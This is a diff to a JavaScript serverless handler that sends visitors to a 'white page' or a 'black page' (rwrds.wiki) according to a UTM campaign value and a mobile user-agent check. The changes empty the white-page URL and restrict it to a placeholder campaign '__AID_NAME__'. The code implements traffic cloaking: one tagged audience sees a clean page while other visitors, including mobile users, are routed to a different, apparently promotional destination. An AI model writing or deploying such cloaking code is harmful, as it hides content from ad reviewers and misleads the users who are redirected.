@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://nomanwalksalone.com/collections/found-feather";
+    const whitePageURL = "";
     const blackPageURL = "https://rwrds.wiki";
   
     // Parse the UTM parameters from the request URL
@@ -12,7 +12,7 @@ export default function handler(req, res) {
     const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
   
     // Redirection logic
-    if (utmCampaign && utmCampaign.length > 0) {
+    if (utmCampaign === '__AID_NAME__') {
       // UTM campaign 'l1' takes priority for both desktop and mobile
       res.writeHead(302, { Location: whitePageURL });
     } else if (isMobileDevice) {
